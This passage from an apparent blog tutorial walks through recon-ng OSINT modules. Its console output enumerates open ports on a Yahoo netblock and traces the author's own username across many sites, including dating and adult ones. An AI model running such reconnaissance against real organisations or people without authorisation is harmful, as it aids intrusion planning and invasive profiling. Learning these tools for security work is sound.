<li><p>YouTube Geolocation Search &ndash; Searches YouTube for media in the specified proximity to a location.</p></li>
<li><p>Whois Company Harvester &ndash; Uses the ARIN Whois RWS to harvest Companies data from whois queries for the given netblock. Updates
the &lsquo;companies&rsquo; table with the results.</p></li>
<li><p>Reverse Resolver &ndash; Conducts a reverse lookup for each of a netblock&rsquo;s IP addresses to resolve the hostname. Updates the
&lsquo;hosts&rsquo; table with the results.</p></li>
<li><p>Shodan Network Enumerator &ndash; Harvests hosts from the Shodan API by using the &lsquo;net&rsquo; search operator. Updates the &lsquo;hosts&rsquo; table
with the results.</p></li>
<li><p>Internet Census 2012 Lookup &ndash; Queries the Internet Census 2012 data through Exfiltrated.com to enumerate open ports for a
netblock.</p></li>
</ul>


<p>This will come in handy to give you an idea about hosts without directly port scanning them:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[recon-ng][default][census_2012] &gt; run
</span><span class='line'>
</span><span class='line'>-----------
</span><span class='line'>8.3.34.0/23
</span><span class='line'>-----------
</span><span class='line'>[*] 8.3.34.0/23 (8.3.34.0 - 8.3.35.255)
</span><span class='line'>[*] 8.3.34.5 (rsw4-1-gci.smpenn.corp.yahoo.com) - 80
</span><span class='line'>[*] 8.3.34.28 (UNKNOWN-8-3-34-X.yahoo.com) - 80
</span><span class='line'>[*] 8.3.34.46 (UNKNOWN-8-3-34-X.yahoo.com) - 80
</span><span class='line'>[*] 8.3.34.60 (UNKNOWN-8-3-34-X.yahoo.com) - 80
</span><span class='line'>[*] 8.3.34.66 (UNKNOWN-8-3-34-X.yahoo.com) - 80
</span><span class='line'>[*] 8.3.34.79 (UNKNOWN-8-3-34-X.yahoo.com) - 80
</span><span class='line'>[*] 8.3.34.222 (UNKNOWN-8-3-34-X.yahoo.com) - 80
</span><span class='line'>[*] 8.3.34.225 (UNKNOWN-8-3-34-X.yahoo.com) - 80
</span><span class='line'>[*] 8.3.34.231 (UNKNOWN-8-3-34-X.yahoo.com) - 25
</span><span class='line'>[*] 8.3.34.231 (UNKNOWN-8-3-34-X.yahoo.com) - 80
</span><span class='line'>[*] 8.3.34.246 (tstsqlclstr1d.smca.yahoo.com) - 80
</span><span class='line'>[*] 8.3.34.255 (UNKNOWN-8-3-34-X.yahoo.com) - 80
</span><span class='line'>[*] 8.3.35.71 (UNKNOWN-8-3-35-X.yahoo.com) - 80
</span><span class='line'>[*] 8.3.35.182 (UNKNOWN-8-3-35-X.yahoo.com) - 25
</span><span class='line'>[*] 8.3.35.182 (UNKNOWN-8-3-35-X.yahoo.com) - 80
</span><span class='line'>[*] 8.3.35.186 (UNKNOWN-8-3-35-X.yahoo.com) - 80
</span><span class='line'>[*] 8.3.35.220 (UNKNOWN-8-3-35-X.yahoo.com) - 80
</span><span class='line'>
</span><span class='line'>-------
</span><span class='line'>SUMMARY
</span><span class='line'>-------
</span><span class='line'>[*] 17 total (17 new) ports found.</span></code></pre></td></tr></table></div></figure>


<p>`</p>

<ul>
<li><p>Ports to Hosts Data Migrator &ndash; Adds a new host for all the hostnames stored in the &lsquo;ports&rsquo; table.</p></li>
<li><p>Dev Diver Repository Activity Examiner &ndash; Searches public code repositories for information about a given username.</p></li>
</ul>


<p>This is another useful module to search for a developer on different platforms (note to self: I have to get back into coding frenzy):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[recon-ng][default][dev_diver] &gt; run
</span><span class='line'>[*] Checking Github...
</span><span class='line'>[*] Github username found - (https://api.github.com/users/chousensha)
</span><span class='line'>
</span><span class='line'>  +-------------------------------------------------------------------+
</span><span class='line'>  |                               Github                              |
</span><span class='line'>  +-------------------------------------------------------------------+
</span><span class='line'>  | Resource    | Github                                              |
</span><span class='line'>  | User Name   | chousensha                                          |
</span><span class='line'>  | Profile URL | https://github.com/chousensha                       |
</span><span class='line'>  | Avatar URL  | https://avatars.githubusercontent.com/u/5703557?v=3 |
</span><span class='line'>  | Location    |                                                     |
</span><span class='line'>  | Company     |                                                     |
</span><span class='line'>  | Blog URL    | http://chousensha.github.io/                        |
</span><span class='line'>  | Email       |                                                     |
</span><span class='line'>  | Bio         |                                                     |
</span><span class='line'>  | Followers   | 2                                                   |
</span><span class='line'>  | ID          | 5703557                                             |
</span><span class='line'>  | Joined      | 2013-10-16                                          |
</span><span class='line'>  | Updated     | 2016-04-29                                          |
</span><span class='line'>  +-------------------------------------------------------------------+
</span><span class='line'>
</span><span class='line'>[*] Checking Bitbucket...
</span><span class='line'>[*] Bitbucket username not found.
</span><span class='line'>[*] Checking SourceForge...
</span><span class='line'>[*] Sourceforge username not found.
</span><span class='line'>[*] Checking CodePlex...
</span><span class='line'>[*] CodePlex username not found.
</span><span class='line'>[*] Checking Gitorious...
</span><span class='line'>[*] Gitorious username not found.
</span><span class='line'>
</span><span class='line'>-------
</span><span class='line'>SUMMARY
</span><span class='line'>-------
</span><span class='line'>[*] 1 total (1 new) contacts found.</span></code></pre></td></tr></table></div></figure>


<ul>
<li><p>Linkedin Contact Crawler &ndash; Harvests contact information from linkedin.com by parsing the link(s) given and adding the info to
the &lsquo;contacts&rsquo; table.</p></li>
<li><p>Linkedin Profile Crawler &ndash; Harvests profiles from linkedin.com by visting the given link(s), crawling the &ldquo;Viewers of this
profile also viewed&rdquo;, parsing the pages, and adding new profiles to the &lsquo;profiles&rsquo; table</p></li>
<li><p>NameChk.com Username Validator &ndash; Leverages NameChk.com to validate the existance of usernames on specific web sites and updates the
&lsquo;profiles&rsquo; table with the results.</p></li>
</ul>


<p>Good for recon but also for checking if how unique is your l33t handle:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[recon-ng][default][namechk] &gt; run
</span><span class='line'>[*] Retrieving site data...
</span><span class='line'>
</span><span class='line'>----------
</span><span class='line'>CHOUSENSHA
</span><span class='line'>----------
</span><span class='line'>[*] Wordpress: Available.
</span><span class='line'>[*] Reddit: Available.
</span><span class='line'>[*] Blogger: Available.
</span><span class='line'>[*] GooglePlus: Available.
</span><span class='line'>[*] Ebay: Available.
</span><span class='line'>[*] Twitch: Available.
</span><span class='line'>[*] Instagram: Available.
</span><span class='line'>[*] Twitter: User exists!
</span><span class='line'>[*] Facebook: User exists!
</span><span class='line'>[*] Slack: Available.
</span><span class='line'>[*] PayPal: Available.
</span><span class='line'>[*] Pinterest: Available.
</span><span class='line'>[*] Vine: User exists!
</span><span class='line'>[*] Github: User exists!
</span><span class='line'>[*] Basecamp: Available.
</span><span class='line'>[*] Flickr: Available.
</span><span class='line'>[*] Pandora: Available.
</span><span class='line'>[*] Spotify: Available.
</span><span class='line'>[*] YouTube: User exists!
</span><span class='line'>[*] MySpace: Available.
</span><span class='line'>[*] Steam: Available.
</span><span class='line'>[*] Flipboard: Available.
</span><span class='line'>[*] OkCupid: Available.
</span><span class='line'>[*] UStream: Available.
</span><span class='line'>[*] Vimeo: Available.
</span><span class='line'>[*] Etsy: User exists!
</span><span class='line'>[*] BitBucket: Available.
</span><span class='line'>[*] SoundCloud: Available.
</span><span class='line'>[*] 500px: Available.
</span><span class='line'>[*] CashMe: Available.
</span><span class='line'>[*] Meetup: Available.
</span><span class='line'>[*] DailyMotion: Available.
</span><span class='line'>[*] About.me: User exists!
</span><span class='line'>[*] ProductHunt: Available.
</span><span class='line'>[*] Disqus: User exists!
</span><span class='line'>[*] Medium: User exists!
</span><span class='line'>[*] Behance: Available.
</span><span class='line'>[*] Imgur: Available.
</span><span class='line'>[*] Bit.ly: User exists!
</span><span class='line'>[*] Fanpop: Available.
</span><span class='line'>[*] Cafe Mom: Available.
</span><span class='line'>[*] Instructables: Available.
</span><span class='line'>[*] Photobucket: Available.
</span><span class='line'>[*] Good Reads: Available.
</span><span class='line'>[*] deviantART: Available.
</span><span class='line'>[*] Tumblr: Available.
</span><span class='line'>[*] Gravatar: Available.
</span><span class='line'>[*] Venmo: User exists!
</span><span class='line'>[*] Keybase: Available.
</span><span class='line'>[*] StumbleUpon: User exists!
</span><span class='line'>[*] Kongregate: User exists!
</span><span class='line'>[*] LiveJournal: Available.
</span><span class='line'>[*] Yelp: User exists!
</span><span class='line'>[*] Codecademy: Available.
</span><span class='line'>[*] Foursquare: Available.
</span><span class='line'>[*] Team Treehouse: Available.
</span><span class='line'>[*] AngelList: Available.
</span><span class='line'>[*] Viddler: Available.
</span><span class='line'>[*] tsu: Available.
</span><span class='line'>[*] last.fm: Available.
</span><span class='line'>[*] Technorati: Available.
</span><span class='line'>[*] Aviary: User exists!
</span><span class='line'>[*] Fotolog: User exists!
</span><span class='line'>[*] Slideshare: Available.
</span><span class='line'>[*] Blinklist: Available.
</span><span class='line'>[*] Tripit: User exists!
</span><span class='line'>[*] GogoBot: Available.
</span><span class='line'>[*] Flavors.me: Available.
</span><span class='line'>[*] BuzzFeed: Available.
</span><span class='line'>[*] TripAdvisor: Available.
</span><span class='line'>[*] blip.fm: Available.
</span><span class='line'>[*] Dribbble: Available.
</span><span class='line'>[*] Geeklist: User exists!
</span><span class='line'>[*] Papaly: Available.
</span><span class='line'>[*] wishlistr: Available.
</span><span class='line'>[*] Vk: Available.
</span><span class='line'>[*] Pastebin: Available.
</span><span class='line'>[*] Coinbase: Available.
</span><span class='line'>[*] iFunny: Available.
</span><span class='line'>[*] Roblox: User exists!
</span><span class='line'>[*] XFire: Available.
</span><span class='line'>[*] Witty: User exists!
</span><span class='line'>[*] Wikipedia: Available.
</span><span class='line'>[*] Hackernews: User exists!
</span><span class='line'>[*] StreamMe: Available.
</span><span class='line'>[*] Abouto: Available.
</span><span class='line'>[*] qmpeople: Available.
</span><span class='line'>[*] Fiverr: Available.
</span><span class='line'>[*] Plenty Of Fish: Available.
</span><span class='line'>[*] Voat: User exists!
</span><span class='line'>[*] Trakt: Available.
</span><span class='line'>[*] IFTTT: Available.
</span><span class='line'>[*] Crokes: User exists!
</span><span class='line'>[*] Tracky: Available.
</span><span class='line'>[*] GetSatisfaction: Available.
</span><span class='line'>[*] Ello: User exists!
</span><span class='line'>
</span><span class='line'>-------
</span><span class='line'>SUMMARY
</span><span class='line'>-------
</span><span class='line'>[*] 24 total (24 new) profiles found.</span></code></pre></td></tr></table></div></figure>


<p>Hmm, quite a few other &ldquo;challengers&rdquo;.</p>

<ul>
<li>OSINT HUMINT Profile Collector &ndash; Takes each username from the profiles table and searches a variety of web sites for those users.</li>
</ul>


<p>This one checks 191 sites for the username, here we go:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
<span class='line-number'>146</span>
<span class='line-number'>147</span>
<span class='line-number'>148</span>
<span class='line-number'>149</span>
<span class='line-number'>150</span>
<span class='line-number'>151</span>
<span class='line-number'>152</span>
<span class='line-number'>153</span>
<span class='line-number'>154</span>
<span class='line-number'>155</span>
<span class='line-number'>156</span>
<span class='line-number'>157</span>
<span class='line-number'>158</span>
<span class='line-number'>159</span>
<span class='line-number'>160</span>
<span class='line-number'>161</span>
<span class='line-number'>162</span>
<span class='line-number'>163</span>
<span class='line-number'>164</span>
<span class='line-number'>165</span>
<span class='line-number'>166</span>
<span class='line-number'>167</span>
<span class='line-number'>168</span>
<span class='line-number'>169</span>
<span class='line-number'>170</span>
<span class='line-number'>171</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[recon-ng][default][profiler] &gt; run
</span><span class='line'>[*] Retrieving https://raw.githubusercontent.com/WebBreacher/WhatsMyName/master/web_accounts_list.json...
</span><span class='line'>
</span><span class='line'>  Looking Up Data For: Chousensha
</span><span class='line'>  -------------------------------
</span><span class='line'>[*] Checking: about.me
</span><span class='line'>[*] Checking: AdultFriendFinder
</span><span class='line'>[*] Checking: Matchdoctor
</span><span class='line'>[*] Checking: AngelList
</span><span class='line'>[*] Checking: aNobil
</span><span class='line'>[*] Checking: ask.fm
</span><span class='line'>[*] Checking: Atlassian
</span><span class='line'>[*] Checking: Atlassian Self-Signup
</span><span class='line'>[*] Checking: AudioBoom
</span><span class='line'>[*] Checking: authorSTREAM
</span><span class='line'>[*] Checking: badoo
</span><span class='line'>[*] Checking: Bitbucket
</span><span class='line'>[*] Checking: BLIP.fm
</span><span class='line'>[*] Checking: Black Planet
</span><span class='line'>[*] Checking: Blogmarks
</span><span class='line'>[*] Checking: Blogspot
</span><span class='line'>[*] Checking: BodyBuilding.com
</span><span class='line'>[*] Checking: Break
</span><span class='line'>[*] Checking: Bugcrowd
</span><span class='line'>[*] Checking: cafemom
</span><span class='line'>[*] Checking: CarDomain
</span><span class='line'>[*] Checking: cHEEZburger
</span><span class='line'>[*] Checking: CodePlex
</span><span class='line'>[*] Checking: CoderStats
</span><span class='line'>[*] Checking: COLOURlovers
</span><span class='line'>[*] Checking: Conferize
</span><span class='line'>[*] Checking: copytaste
</span><span class='line'>[*] Checking: cruiseMates
</span><span class='line'>[*] Checking: Dailymotion
</span><span class='line'>[*] Checking: Delicious
</span><span class='line'>[*] Checking: DeviantArt
</span><span class='line'>[*] Checking: diigo
</span><span class='line'>[*] Checking: DIY
</span><span class='line'>[*] Checking: eBay
</span><span class='line'>[*] Checking: EightBit
</span><span class='line'>[*] [profile] chousensha - CoderStats (http://coderstats.net/github/chousensha/)
</span><span class='line'>[*] Checking: Engadget
</span><span class='line'>[*] Checking: EPORNER
</span><span class='line'>[*] Checking: Etsy
</span><span class='line'>[*] Checking: facebook.com
</span><span class='line'>[*] Checking: families.com
</span><span class='line'>[*] Checking: fanpop
</span><span class='line'>[*] Checking: FFFFOUND!
</span><span class='line'>[*] Checking: Fiverr
</span><span class='line'>[*] Checking: Flickr
</span><span class='line'>[*] Checking: Foodspotting
</span><span class='line'>[*] Checking: Fotolog
</span><span class='line'>[*] Checking: Foursquare
</span><span class='line'>[*] Checking: freesound
</span><span class='line'>[*] Checking: FriendFinder-X
</span><span class='line'>[*] Checking: FunnyOrDie
</span><span class='line'>[*] Checking: Garmin connect
</span><span class='line'>[*] Checking: GeekGrade
</span><span class='line'>[*] Checking: Geocaching
</span><span class='line'>[*] Checking: GETItON
</span><span class='line'>[*] Checking: GitHub
</span><span class='line'>[*] Checking: gogobot
</span><span class='line'>[*] Checking: goodreads
</span><span class='line'>[*] Checking: Gravatar
</span><span class='line'>[*] Checking: howaboutwe
</span><span class='line'>[*] Checking: HubPages
</span><span class='line'>[*] Checking: I-am-pregnant
</span><span class='line'>[*] Checking: IFTTT
</span><span class='line'>[*] [profile] chousensha - GitHub (https://api.github.com/users/chousensha)
</span><span class='line'>[*] Checking: ImageShack
</span><span class='line'>[*] Checking: imgur
</span><span class='line'>[*] Checking: InsaneJournal
</span><span class='line'>[*] Checking: Instagram
</span><span class='line'>[*] Checking: instructables
</span><span class='line'>[*] Checking: Internet Archive
</span><span class='line'>[*] Checking: interpals
</span><span class='line'>[*] Checking: Keybase
</span><span class='line'>[*] Checking: Klear
</span><span class='line'>[*] Checking: Klout
</span><span class='line'>[*] Checking: Kongregate
</span><span class='line'>[*] Checking: Lanyrd
</span><span class='line'>[*] Checking: Last.fm
</span><span class='line'>[*] Checking: LibraryThing
</span><span class='line'>[*] Checking: LinkedIn
</span><span class='line'>[*] Checking: LiveJasmin
</span><span class='line'>[*] Checking: Marketing Land
</span><span class='line'>[*] Checking: mate1
</span><span class='line'>[*] [profile] chousensha - Kongregate (http://www.kongregate.com/accounts/chousensha)
</span><span class='line'>[*] Checking: Medium
</span><span class='line'>[*] Checking: Meetzur
</span><span class='line'>[*] Checking: Microsoft Technet Community
</span><span class='line'>[*] Checking: Mixcloud
</span><span class='line'>[*] Checking: Mixcrate
</span><span class='line'>[*] Checking: Mixlr
</span><span class='line'>[*] Checking: Mod DB
</span><span class='line'>[*] Checking: Muck Rack
</span><span class='line'>[*] [profile] chousensha - Internet Archive (http://archive.org/search.php?query=chousensha)
</span><span class='line'>[*] Checking: MyBuilder.com
</span><span class='line'>[*] Checking: MyFitnessPal
</span><span class='line'>[*] Checking: MyLot
</span><span class='line'>[*] Checking: Myspace
</span><span class='line'>[*] Checking: netvibes
</span><span class='line'>[*] Checking: Newsvine
</span><span class='line'>[*] Checking: Overcast Network
</span><span class='line'>[*] Checking: Photoblog
</span><span class='line'>[*] Checking: PhotoBucket
</span><span class='line'>[*] Checking: PictureTrail
</span><span class='line'>[*] Checking: PinkBike
</span><span class='line'>[*] Checking: Pinterest
</span><span class='line'>[*] Checking: Playlists.net
</span><span class='line'>[*] Checking: Plurk
</span><span class='line'>[*] Checking: POF
</span><span class='line'>[*] Checking: Porn.com
</span><span class='line'>[*] Checking: Pornhub
</span><span class='line'>[*] Checking: PSNProfiles
</span><span class='line'>[*] Checking: raptr
</span><span class='line'>[*] Checking: Readability
</span><span class='line'>[*] Checking: Reunion.com
</span><span class='line'>[*] Checking: scratch
</span><span class='line'>[*] Checking: Security Street
</span><span class='line'>[*] Checking: SEOClerks
</span><span class='line'>[*] Checking: setlist.fm
</span><span class='line'>[*] Checking: Shopcade
</span><span class='line'>[*] Checking: singlemuslim
</span><span class='line'>[*] Checking: slideshare
</span><span class='line'>[*] Checking: SmugMug
</span><span class='line'>[*] Checking: smule
</span><span class='line'>[*] Checking: snooth
</span><span class='line'>[*] Checking: Soup
</span><span class='line'>[*] Checking: Speaker Deck
</span><span class='line'>[*] Checking: sporcle
</span><span class='line'>[*] Checking: Steam
</span><span class='line'>[*] Checking: stupidcancer
</span><span class='line'>[*] Checking: TF2 Backpack Examiner
</span><span class='line'>[*] Checking: theguardian
</span><span class='line'>[*] Checking: thesixtyone
</span><span class='line'>[*] Checking: tribe
</span><span class='line'>[*] Checking: tripadvisor
</span><span class='line'>[*] Checking: Tripit
</span><span class='line'>[*] Checking: tumblr
</span><span class='line'>[*] Checking: Twitter
</span><span class='line'>[*] Checking: untappd
</span><span class='line'>[*] Checking: uSTREAM
</span><span class='line'>[*] Checking: viddler
</span><span class='line'>[*] Checking: VideoLike
</span><span class='line'>[*] Checking: vidme
</span><span class='line'>[*] Checking: Vimeo
</span><span class='line'>[*] Checking: Vine
</span><span class='line'>[*] Checking: VisualizeUs
</span><span class='line'>[*] Checking: Voices.com
</span><span class='line'>[*] Checking: Wanelo
</span><span class='line'>[*] Checking: wattpad
</span><span class='line'>[*] Checking: WeeWorld
</span><span class='line'>[*] Checking: wishlistr
</span><span class='line'>[*] [profile] chousensha - VideoLike (http://videolike.org/video/chousensha)
</span><span class='line'>[*] Checking: Wikipedia
</span><span class='line'>[*] [profile] chousensha - Twitter (https://twitter.com/chousensha)
</span><span class='line'>[*] Checking: WordPress
</span><span class='line'>[*] Checking: WordPress Support
</span><span class='line'>[*] Checking: Xanga
</span><span class='line'>[*] Checking: Xbox Gamertag
</span><span class='line'>[*] Checking: xHamster
</span><span class='line'>[*] Checking: XVIDEOS
</span><span class='line'>[*] Checking: YouTube
</span><span class='line'>[*] Checking: Zooppa
</span><span class='line'>[*] [profile] chousensha - YouTube (https://www.youtube.com/user/chousensha/videos)
</span><span class='line'>
</span><span class='line'>-------
</span><span class='line'>SUMMARY
</span><span class='line'>-------
</span><span class='line'>[*] 7 total (5 new) profiles found.</span></code></pre></td></tr></table></div></figure>


<ul>
<li><p>Twitter Handles &ndash; Searches Twitter for users that mentioned, or were mentioned by, the given handle.</p></li>
<li><p>Github Code Enumerator &ndash; Uses the Github API to enumerate repositories and gists owned by a Github user. Updates the
&lsquo;repositories&rsquo; table with the results.</p></li>
<li><p>Github Commit Searcher &ndash; Uses the Github API to gather user profiles from repository commits. Updates the &lsquo;profiles&rsquo; table
with the results.</p></li>
<li><p>Github Gist Searcher &ndash; Uses the Github API to download and search Gists for possible information disclosures. Updates the
&lsquo;vulnerabilities&rsquo; table with the results</p></li>
<li><p>Github Dork Analyzer &ndash; Uses the Github API to search for possible vulnerabilites in source code by leveraging Github Dorks
and the &lsquo;repo&rsquo; search operator. Updates the &lsquo;vulnerabilities&rsquo; table with the results.</p></li>
<li><p>Indeed Resume Crawl &ndash; Crawls Indeed.com for contacts and resumes. Adds name, title, and location to the contacts table and
a link to the resume in the profiles table. Can only harvest the first 1,000 results. Result set
changes, so running the same crawl mutiple times can produce new contacts. If the PAST_EMPS option
is set to true, the module will crawl both current and past employees. Given a keyword, the module
will only harvest contacts whose resumes contain the keyword. (e.g. Linux Admin)</p></li>
<li><p>Meta Data Extractor &ndash; Searches for files associated with the provided domain(s) and extracts any contact related metadata</p></li>
<li><p>HackerTarget Lookup &ndash; Uses the HackerTarget.com API to find host names. Updates the &lsquo;hosts&rsquo; table with the results.</p></li>
<li><p>ThreatCrowd DNS lookup &ndash; Leverages the ThreatCrowd passive DNS API to discover hosts/subdomains.</p></li>
<li><p>Google Hacking Database &ndash; Searches for possible vulnerabilites in a domain by leveraging the Google Hacking Database (GHDB)
